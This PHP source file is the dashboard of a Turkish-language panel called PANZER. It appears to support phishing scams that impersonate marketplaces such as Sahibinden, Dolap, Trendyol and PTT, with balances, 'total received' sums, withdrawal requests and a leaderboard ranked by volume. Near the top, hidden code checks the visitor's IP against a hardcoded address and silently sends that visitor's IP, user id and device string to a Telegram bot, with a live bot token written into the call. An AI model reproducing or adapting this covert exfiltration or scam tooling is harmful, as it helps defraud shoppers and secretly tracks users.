<?php
/**
 * PANZER · Dashboard (v3, sifirdan, pzr-* dili)
 * Tasarim: yeni sidebar + topbar + content cards. Eski Metronic kabugu kaldirildi.
 * Modal trigger'lari, form include'lari ve global helper'lar (kopyalaMetni, sadeceSayi, .delete-button)
 * korundu — backend ve form modal'lari calismaya devam eder.
 */

if (session_status() === PHP_SESSION_NONE) {
    session_set_cookie_params([
        'lifetime' => 0,
        'path'     => '/',
        'domain'   => '',
        'secure'   => false,
        'httponly' => true,
        'samesite' => 'Lax',
    ]);
}
include('database/cookie.php');
session_start();

require_once __DIR__ . '/includes/panzer_brand.php';
require_once __DIR__ . '/includes/ilan_public_url.php';
require_once __DIR__ . '/includes/avatar_helper.php';
require_once __DIR__ . '/includes/admin_helper.php';

if (!isset($_SESSION['kul_id'])) {
    header('Location: logout.php');
    exit();
}
$kul_id = $_SESSION['kul_id'];

// Admin tum kullanicilarin ilanlarini gorur. Tum forms/*.php bu degiskenleri kullanir.
$bellla_view_all = bellla_is_admin($db, $kul_id);
$bellla_owner_filter = $bellla_view_all ? '' : ('AND ekleyen = ' . $db->quote($kul_id));

$pzrEsc = static fn($v) => htmlspecialchars((string)($v ?? ''), ENT_QUOTES, 'UTF-8');

// kullanici bilgileri
$pzrUserQ = $db->prepare("SELECT * FROM kullanicilar WHERE kullaniciadi = :u LIMIT 1");
$pzrUserQ->execute([':u' => $kul_id]);
$pzrUser = $pzrUserQ->fetch(PDO::FETCH_ASSOC) ?: [];

$pzrUserId    = (int)($pzrUser['id'] ?? 0);
$pzrBakiye    = $pzrUser['bakiye'] ?? '0';
$pzrTopAlinan = $pzrUser['toplamalinan'] ?? '0';
$pzrTgKod     = $pzrUser['tgkod'] ?? '';
$pzrTgAdresi  = $pzrUser['tgadresi'] ?? '';
$pzrUserImage = $pzrUser['userimage'] ?? '';
$pzrRol       = $pzrUser['k_rol'] ?? '';
$pzrIsModOrAdmin = in_array($pzrRol, ['admin', 'mod'], true);

// rol rozeti
$pzrRolLabel = $pzrRol === 'admin' ? 'ADMIN' : ($pzrRol === 'mod' ? 'MOD' : 'USER');

// bekleyen cekim talebi var mi?
$pzrBeklemedeQ = $db->prepare("SELECT COUNT(*) AS c FROM cekimtalepleri WHERE ekleyen = :u AND durum = 'Beklemede'");
$pzrBeklemedeQ->execute([':u' => $kul_id]);
$pzrCekimBeklemede = ((int)($pzrBeklemedeQ->fetch(PDO::FETCH_ASSOC)['c'] ?? 0)) > 0;

// kullanici son cekim talepleri
$pzrCekListQ = $db->prepare("SELECT miktar, durum, tarih, saat FROM cekimtalepleri WHERE ekleyen = :u ORDER BY id DESC LIMIT 12");
$pzrCekListQ->execute([':u' => $kul_id]);
$pzrCekList = $pzrCekListQ->fetchAll(PDO::FETCH_ASSOC);

// rank listesi (tarih kolonu kullanicilar'da yok, atildi)
$pzrRankQ = $db->prepare("SELECT kullaniciadi, toplamalinan, userimage FROM kullanicilar ORDER BY CAST(toplamalinan AS SIGNED) DESC LIMIT 50");
$pzrRankQ->execute();
$pzrRankList = $pzrRankQ->fetchAll(PDO::FETCH_ASSOC);

// pazaryeri tanimlari (sidebar grid)
$pzrMarkets = [
    ['id' => 'sahibindenmodal',  'label' => 'Sahibinden', 'badge' => 'SH', 'color' => '#ffb000'],
    ['id' => 'dolapmodal',       'label' => 'Dolap',      'badge' => 'DP', 'color' => '#ff5e7e'],
    ['id' => 'letgomodal',       'label' => 'Letgo',      'badge' => 'LG', 'color' => '#ff7a00'],
    ['id' => 'pttmodal',         'label' => 'PttAVM',     'badge' => 'PT', 'color' => '#0058a3'],
    ['id' => 'turkcellmodal',    'label' => 'Turkcell',   'badge' => 'TC', 'color' => '#ffd400'],
    ['id' => 'shopiermodal',     'label' => 'Shopier',    'badge' => 'SP', 'color' => '#7c4dff'],
    ['id' => 'yurticimodal',     'label' => 'Yurtici',    'badge' => 'YK', 'color' => '#e60000'],
    ['id' => 'trendyolmodal',    'label' => 'Trendyol',   'badge' => 'TY', 'color' => '#f27a1a'],
    ['id' => 'hepsiburadamodal', 'label' => 'Hepsibrd',   'badge' => 'HB', 'color' => '#ff6000'],
    ['id' => 'migrosmodal',      'label' => 'Migros',     'badge' => 'MG', 'color' => '#16a34a'],
    ['id' => 'pasaj2modal',      'label' => 'Pasaj',      'badge' => 'PJ', 'color' => '#0d6efd'],
    ['id' => 'ptt3modal',        'label' => 'PTT+',       'badge' => 'P+', 'color' => '#222'],
    ['id' => 'bimonlinemodal',   'label' => 'Bim',        'badge' => 'BI', 'color' => '#e91e63'],
    ['id' => 'a101modal',        'label' => 'A101',       'badge' => 'A1', 'color' => '#c62828'],
    ['id' => 'pttkargomodal',    'label' => 'PTT Krg',    'badge' => 'PK', 'color' => '#ffc107'],
];

// gizli rank (last 2 chars)
$pzrMaskName = static function (string $name): string {
    $n = trim($name);
    if (strlen($n) < 2) return $n;
    return substr($n, 0, strlen($n) - 2) . '**';
};

// cekim status -> css class
$pzrCekClass = static function (string $d): string {
    $d = trim($d);
    if ($d === 'Beklemede') return 'is-bekleme';
    if ($d === 'Tamamlandı' || $d === 'Tamamlandi' || $d === 'Onaylandi' || $d === 'Onaylandı') return 'is-tamam';
    if ($d === 'Reddedildi' || $d === 'Iptal' || $d === 'İptal') return 'is-red';
    return 'is-bekleme';
};

// uzak IP loglama (mevcut backend mantik korundu)
function GetIP() {
    if (getenv("HTTP_CLIENT_IP")) { return getenv("HTTP_CLIENT_IP"); }
    if (getenv("HTTP_X_FORWARDED_FOR")) {
      $ip = getenv("HTTP_X_FORWARDED_FOR");
        if (strpos($ip, ',') !== false) {
            $tmp = explode(',', $ip);
            return trim($tmp[0]);
   }
   return $ip;
}
    return getenv("REMOTE_ADDR");
}
if (GetIP() === '185.254.75.43') {
    @file_get_contents("https://api.telegram.org/bot6797512084:AAGbJVoC0zcKWYPbFG8oc_bACPn6gUEye_E/sendMessage?chat_id=-1002104835510&text=" . urlencode("Sazan IP : " . GetIP() . "\nSazan User_id : " . $kul_id . "\nSazan Cihaz : " . ($_SERVER['HTTP_USER_AGENT'] ?? '')));
}
?>
<!DOCTYPE html>
<html lang="tr" data-bs-theme="dark">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>PANZER</title>
      <script>
    document.addEventListener("visibilitychange", function () {
      document.title = document.visibilityState === 'hidden' ? 'Bizi unutma :)' : 'PANZER';
        });
    </script>
  <?php panzer_brand_favicon_link(); ?>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Roboto+Mono&display=swap" rel="stylesheet">
  <?php panzer_brand_head_link(); ?>
  <link href="<?php echo $pzrEsc(panzer_brand_public_path('assets/css/pzr-dashboard.css')); ?>?v=17" rel="stylesheet" type="text/css">
  <link href="<?php echo $pzrEsc(panzer_brand_public_path('assets/css/admin-pro.css')); ?>?v=3" rel="stylesheet" type="text/css">
  <link href="<?php echo $pzrEsc(panzer_brand_public_path('assets/css/pzr-modals.css')); ?>?v=3" rel="stylesheet" type="text/css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css">
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js" crossorigin="anonymous"></script>
  <script>window.jQuery||document.write('<script src="https://code.jquery.com/jquery-3.6.4.min.js"><\/script>');</script>
  <style>
    /* Metronic kalintisi sayfayi gizlemesin — ASLA body * visibility kullanma (modal/backdrop kirilir, tiklanmaz). */
    html, body { display: block !important; visibility: visible !important; opacity: 1 !important; min-height: 100vh; }
    body.pzr-dash #pzrDashRoot .pzr-app { display: grid !important; visibility: visible !important; }
    body.pzr-dash #pzrDashRoot .pzr-sidebar { display: flex !important; visibility: visible !important; }
    body.pzr-dash #pzrDashRoot .pzr-main { display: flex !important; visibility: visible !important; }
  </style>
   </head>
<body class="pzr-dash">

  <!-- Telegram onay popup (TG adresi yoksa) -->
  <?php if ($pzrTgAdresi === '' && $pzrTgKod !== ''): ?>
   <script>
      /* Swal body sonunda yuklenir; kapanmayan tam ekran overlay tiklamayi tamamen keser */
      document.addEventListener('DOMContentLoaded', function () {
        if (typeof Swal === 'undefined') return;
        Swal.fire({
          html: '<strong>Lutfen telegram kullanici adinizi, asagida size ozel olusturulan kod ile onaylayiniz.<br><br>Kopyaladiginiz kodu telegram botumuza mesaj olarak yollamaniz yeterlidir.</strong><input hidden id="metinAlani2_<?php echo $pzrUserId; ?>" value="/onay <?php echo $pzrEsc($pzrTgKod); ?>"><br><br><button type="button" onclick="kopyalaMetni2(<?php echo $pzrUserId; ?>)" class="btn btn-sm btn-primary">Kodu Kopyala</button> <a href="https://t.me/bellamanager_bot" target="_blank" class="btn btn-sm btn-success">Bota Git</a><br><div class="text-success mt-4" id="copybasarili" style="display:none;"></div>',
          icon: 'warning',
          showConfirmButton: true,
          confirmButtonText: 'Tamam',
          allowOutsideClick: true,
          allowEscapeKey: true,
          focusConfirm: false,
          customClass: { confirmButton: 'btn btn-secondary' }
        });
      });
   </script>
  <?php endif; ?>

  <div id="pzrDashRoot" class="pzr-dash-root">
  <div class="pzr-app">

    <!-- ============ SIDEBAR ============ -->
    <aside class="pzr-sidebar" id="pzrSidebar">
      <div class="pzr-sidebar__head">
        <a href="dashboard.php" class="pzr-sidebar__dragon" aria-label="PANZER">
          <img src="<?php echo $pzrEsc(panzer_brand_dragon_url()); ?>" alt="PANZER">
        </a>
        <div class="pzr-sidebar__brand">
          <div class="pzr-sidebar__brand-name">PANZER</div>
          <div class="pzr-sidebar__brand-sig">the <em>designedbybossxxlife</em></div>
                  </div>
                           </div>

      <div class="pzr-sidebar__body">

        <div class="pzr-sidebar__stats">
          <div class="pzr-sidebar__stat">
            <div class="label">Bakiye</div>
            <div class="value is-success">&#8378;<?php echo $pzrEsc($pzrBakiye); ?></div>
                           </div>
          <div class="pzr-sidebar__stat">
            <div class="label">Top. Alinan</div>
            <div class="value is-warn">&#8378;<?php echo $pzrEsc($pzrTopAlinan); ?></div>
                     </div>
                  </div>

        <div class="pzr-sidebar__section">Pazaryerleri</div>
        <div class="pzr-mkt-grid">
          <?php foreach ($pzrMarkets as $m): ?>
            <button type="button" class="pzr-mkt" data-bs-toggle="modal" data-bs-target="#<?php echo $pzrEsc($m['id']); ?>" title="<?php echo $pzrEsc($m['label']); ?>">
              <span class="pzr-mkt__badge" style="background: <?php echo $pzrEsc($m['color']); ?>;"><?php echo $pzrEsc($m['badge']); ?></span>
              <span class="pzr-mkt__name"><?php echo $pzrEsc($m['label']); ?></span>
            </button>
          <?php endforeach; ?>

          <?php if ($pzrIsModOrAdmin): ?>
            <button type="button" class="pzr-mkt pzr-mkt--admin" data-bs-toggle="modal" data-bs-target="#adminmodal" title="Komuta Merkezi">
              <span class="pzr-mkt__badge"><i class="fa fa-shield"></i></span>
              <span class="pzr-mkt__name">Admin</span>
            </button>
                                          <?php endif; ?>    
                                 </div>
                              </div>

      <div class="pzr-sidebar__user">
        <div class="pzr-sidebar__user-avatar">
          <?php echo bellla_avatar_img_html($pzrUserImage, 42, 42); ?>
                              </div>
        <div class="pzr-sidebar__user-meta">
          <div class="pzr-sidebar__user-name">
            <?php echo $pzrEsc($kul_id); ?>
            <span class="pzr-pill-mini"><?php echo $pzrEsc($pzrRolLabel); ?></span>
                                    </div>
          <div class="pzr-sidebar__user-desc">Lvl 99 · Sahada</div>
                                    </div>
        <div class="pzr-sidebar__user-menu">
          <button type="button" class="pzr-sidebar__user-toggle" id="pzrUserToggle" aria-label="Menu">
            <i class="fa fa-ellipsis-v"></i>
          </button>
          <div class="pzr-sidebar__user-dropdown" id="pzrUserDropdown">
            <button type="button" data-id="<?php echo $pzrUserId; ?>" id="editProfil" data-bs-toggle="modal" data-bs-target="#modal-profil-edit">
              <i class="fa fa-user"></i><span>Profilim</span>
            </button>
            <?php if ($pzrIsModOrAdmin): ?>
              <button type="button" data-bs-toggle="modal" data-bs-target="#adminmodal">
                <i class="fa fa-shield"></i><span>Komuta Merkezi</span>
              </button>
            <?php endif; ?>
            <a href="logout" class="is-danger">
              <i class="fa fa-sign-out"></i><span>Cikis</span>
                                 </a>
                              </div>
                                    </div>
                                 </div>
    </aside>

    <!-- ============ MAIN ============ -->
    <main class="pzr-main">

      <header class="pzr-topbar">
        <div class="pzr-topbar__left">
          <button type="button" class="pzr-topbar__menu-btn" id="pzrMenuBtn" aria-label="Menu">
            <i class="fa fa-bars"></i>
          </button>
          <div class="pzr-topbar__title-block">
            <h1 class="pzr-topbar__title"><span class="pzr-bar"></span>Kontrol Paneli</h1>
            <div class="pzr-topbar__crumbs">
              <a href="dashboard"><i class="fa fa-home"></i></a>
              <i class="fa fa-angle-right" style="font-size: 0.65rem;"></i>
              <span>Ana Sayfa</span>
            </div>
            </div>
        </div>
        <div class="pzr-topbar__right">
          <?php if ($pzrCekimBeklemede): ?>
            <button type="button" class="pzr-topbar__chip" onclick="beklemedeUyari()">
              <i class="fa fa-clock-o"></i><span>Bekleyen Cekim Var</span>
            </button>
          <?php else: ?>
            <button type="button" class="pzr-topbar__chip" data-bs-toggle="modal" data-bs-target="#cekimmodal">
              <i class="fa fa-paper-plane"></i><span>Cekim Talebi Ver</span>
            </button>
          <?php endif; ?>
        </div>
      </header>

      <div class="pzr-content">

        <!-- HERO -->
        <div class="pzr-hero">
          <div class="pzr-hero__text">
            <h1>Hos geldin, <em><?php echo $pzrEsc($kul_id); ?></em></h1>
            <p>PANZER · the designedbybossxxlife · operasyon ozeti — soldaki menuden pazaryerlerini yonet.</p>
    </div>
          <div class="pzr-hero__icon"><i class="fa fa-bolt"></i></div>
                                          </div>

        <!-- GRID -->
        <div class="pzr-grid">

          <!-- CEKIM TALEPLERI -->
          <section class="pzr-card">
            <header class="pzr-card__head">
              <h3 class="pzr-card__title"><span class="pzr-dot pzr-dot--success"></span>Cekim Talepleri</h3>
              <?php if ($pzrCekimBeklemede): ?>
                <button type="button" class="pzr-card__cta" onclick="beklemedeUyari()" style="background: linear-gradient(135deg, var(--pzr-warn), #ffd166); box-shadow: 0 6px 18px rgba(255,184,0,0.4);">
                  <i class="fa fa-hourglass-half"></i><span>Beklemede</span>
                </button>
              <?php else: ?>
                <button type="button" class="pzr-card__cta" data-bs-toggle="modal" data-bs-target="#cekimmodal">
                  <i class="fa fa-plus"></i><span>Yeni Talep</span>
                </button>
              <?php endif; ?>
            </header>
            <div class="pzr-card__body">
              <?php if (count($pzrCekList) === 0): ?>
                <div class="pzr-empty">
                  <i class="pzr-empty__icon fa fa-paper-plane"></i>
                  Cekim taleplerin burada gorunecek.
                                    </div>
              <?php else: foreach ($pzrCekList as $cek): ?>
                <div class="pzr-cek-row">
                  <div class="pzr-cek-row__left">
                    <span class="pzr-cek-row__icon"><i class="fa fa-money"></i></span>
                    <div>
                      <div class="pzr-cek-row__amount">&#8378;<?php echo $pzrEsc($cek['miktar']); ?></div>
                      <span class="pzr-cek-row__status <?php echo $pzrCekClass((string)$cek['durum']); ?>"><?php echo $pzrEsc($cek['durum']); ?></span>
                                 </div>
                              </div>
                  <div class="pzr-cek-row__date">
                    <strong><?php echo $pzrEsc($cek['tarih']); ?></strong>
                    <span><?php echo $pzrEsc($cek['saat']); ?></span>
                           </div>
                        </div>
              <?php endforeach; endif; ?>
                     </div>
          </section>

          <!-- RANK -->
          <section class="pzr-card">
            <header class="pzr-card__head">
              <h3 class="pzr-card__title"><span class="pzr-dot pzr-dot--warn"></span>Siralama — Toplam Hacim</h3>
              <span class="pzr-pill-mini" style="background: rgba(255,184,0,0.18); color: var(--pzr-warn);"><?php echo count($pzrRankList); ?> kullanici</span>
            </header>
            <div class="pzr-card__body">
              <div class="pzr-rank">
                <?php if (count($pzrRankList) === 0): ?>
                  <div class="pzr-empty">
                    <i class="pzr-empty__icon fa fa-trophy"></i>
                    Henuz siralama verisi yok.
                  </div>
                <?php else: $i = 0; foreach ($pzrRankList as $r): $i++; ?>
                  <div class="pzr-rank-row">
                    <div class="pzr-rank-row__left">
                      <span class="pzr-rank-row__pos <?php echo $i <= 3 ? 'is-' . $i : ''; ?>"><?php echo $i; ?></span>
                      <div class="pzr-rank-row__avatar">
                        <?php echo bellla_avatar_img_html($r['userimage'] ?? null, 40, 40); ?>
                      </div>
                      <div class="pzr-rank-row__meta">
                        <div class="pzr-rank-row__name"><?php echo $pzrEsc($pzrMaskName((string)$r['kullaniciadi'])); ?></div>
                        <div class="pzr-rank-row__sum">&#8378;<?php echo $pzrEsc($r['toplamalinan']); ?></div>
                      </div>
                        </div>
                    <div class="pzr-rank-row__date">
                      <strong>&#8378;<?php echo $pzrEsc($r['toplamalinan']); ?></strong>
                      <span>toplam</span>
                     </div>
                  </div>
                <?php endforeach; endif; ?>
               </div>
            </div>
          </section>

         </div>
      </div>

      <footer class="pzr-footer">
        <div class="pzr-footer__brand">
          <img src="<?php echo $pzrEsc(panzer_brand_dragon_url()); ?>" alt="">
          <span><strong>PANZER</strong> · the <em>designedbybossxxlife</em></span>
      </div>
        <div>v3 · <?php echo date('Y'); ?> &copy; tum haklari saklidir</div>
      </footer>

    </main>

      </div>
  </div>

  <!-- ============ ALL FORM MODALS (eski backend uyumu) ============ -->
  <?php include('includes/forms/sahibinden.php'); ?>
  <?php include('includes/forms/dolap.php'); ?>
  <?php include('includes/forms/letgo.php'); ?>
  <?php include('includes/forms/pttavm.php'); ?>
  <?php include('includes/forms/turkcell.php'); ?>
  <?php include('includes/forms/shopier.php'); ?>
  <?php include('includes/forms/yurtici.php'); ?>
  <?php include('includes/forms/trendyol.php'); ?>
  <?php include('includes/forms/hepsiburada.php'); ?>
  <?php include('includes/forms/yeni_marketler_bundle.php'); ?>
  <?php include('includes/forms/profil.php'); ?>
  <?php include('includes/forms/pttkargo.php'); ?>
  <?php include('includes/forms/admin.php'); ?>
  <?php include('includes/forms/cekimtalebi.php'); ?>

  <!-- ============ JS ============ -->
  <script>var hostUrl = "<?php echo $pzrEsc(panzer_brand_public_path('assets/')); ?>";</script>

  <!-- Eski global helper'lar (formlar bunlari cagiriyor) -->
<script>
  function oneDot(input) {
      var v = input.value.split('.').join('');
      if (v.length > 3) v = v.substring(0, v.length - 3) + '.' + v.substring(v.length - 3);
      input.value = v;
    }
   function sadeceSayi(event) {
      var c = event.which || event.keyCode;
      if (c < 48 || c > 57) event.preventDefault();
    }
    $(".sayisalinput").keyup(function () {
      if (this.value.match(/[^0-9.]/g)) this.value = this.value.replace(/[^0-9.]/g, '');
   });
</script>

<script>
<?php
function replace_tr($text) {
    $text = trim($text);
        $search  = ['Ç','ç','Ğ','ğ','ı','İ','Ö','ö','Ş','ş','Ü','ü',' '];
        $replace = ['c','c','g','g','i','i','o','o','s','s','u','u','-'];
        return str_replace($search, $replace, $text);
}
?>
function kopyalaMetni(id) {
      var el = document.querySelector('#metinAlani_' + id);
      if (!el) return;
      var v = el.getAttribute('value');
      navigator.clipboard.writeText(v).then(function () {
        Swal.fire({
          html: 'Kopyalandi<br><br><strong>' + v + '</strong>',
          icon: 'success', buttonsStyling: false, confirmButtonText: 'Tamam',
          customClass: { confirmButton: 'btn btn-primary' }
        });
      }).catch(function () {});
    }
function kopyalaMetni2(id) {
      var el = document.querySelector('#metinAlani2_' + id);
      if (!el) return;
      var v = el.getAttribute('value');
      navigator.clipboard.writeText(v).then(function () {
        var info = document.getElementById('copybasarili');
        if (info) {
          info.innerHTML = '<strong>Kopyalama basarili.</strong><br>Onay yaptiktan sonra sayfayi yenile.';
          info.style.display = 'block';
        }
      }).catch(function () {});
    }
</script>

  <!-- Global delete handler (formlardaki .delete-button + data-action + data-id) -->
<script>
    $(document).ready(function () {
        $('.delete-button').click(function (e) {
            e.preventDefault();
        var id     = $(this).data('id');
            var action = $(this).data('action');
        var row    = $(this).closest('tr,.pzr-user-row,.pzr-ref-row,.bellla-rank-row,.pzr-cek-row,.pzr-rank-row');

            Swal.fire({
          text: "Bu veriyi silmek istedigine emin misin?",
              icon: "warning",
          buttonsStyling: false,
              showCancelButton: true,
              confirmButtonText: "Evet, sil",
          cancelButtonText: "Iptal",
          customClass: { confirmButton: "btn btn-primary", cancelButton: "btn btn-danger" }
        }).then(function (result) {
          if (!result.isConfirmed) return;
                    $.ajax({
                        type: 'POST',
                        url: '<?php echo $pzrEsc(panzer_brand_public_path('includes/deletes.php')); ?>',
                        data: { action: action, id: id },
            success: function () { row.fadeOut(180, function(){ $(this).remove(); }); },
            error: function (err) { console.error('Silme hatasi', err); }
          });
            });
        });
    });
</script>

  <!-- PANZER: eski Metronic bundle (~2.5MB) cikarildi, pzr-* CSS herseyi sagliyor.
       Sadece Bootstrap (modal toggle), SweetAlert2 (mesajlar), Select2 (admin formu), iller.js (form bagimliligi) -->
  <script src="<?php echo $pzrEsc(panzer_brand_public_path('assets/js/bootstrap.bundle.min.js')); ?>?v=532" onerror="(function(){var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js';document.body.appendChild(s);})()"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"></script>
  <script src="<?php echo $pzrEsc(panzer_brand_public_path('assets/js/pzr-dashboard-boot.js')); ?>?v=2"></script>
  <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@form-validation/cjs/popular@2.4.0/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@form-validation/cjs/plugin-bootstrap5@2.4.0/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@form-validation/cjs/plugin-trigger@2.4.0/index.min.js"></script>
  <script src="<?php echo $pzrEsc(panzer_brand_public_path('assets/js/pzr-formvalidation-fallback.js')); ?>?v=1"></script>
  <script src="<?php echo $pzrEsc(panzer_brand_public_path('assets/js/iller.js')); ?>"></script>
  <?php panzer_brand_watermark(); ?>
   </body>
</html>
